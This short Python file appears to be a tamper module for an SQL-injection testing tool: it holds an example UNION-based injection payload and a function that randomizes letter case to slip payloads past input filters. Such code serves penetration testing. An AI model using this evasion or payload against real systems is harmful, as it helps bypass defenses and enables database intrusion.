import random


__example_payload__ = "AS start WHERE 1601=1601 UNION ALL SELECT NULL,NULL"
__type__ = "sending the payload with a random case (upper and lowercase)"


def tamper(payload, **kwargs):
    payload = str(payload)
    identifier = (1, 2)
    retval = ""
    for char in payload:
        if random.choice(identifier) == 1:
            retval += char.upper()
        else:
            retval += char.lower()
    return retval
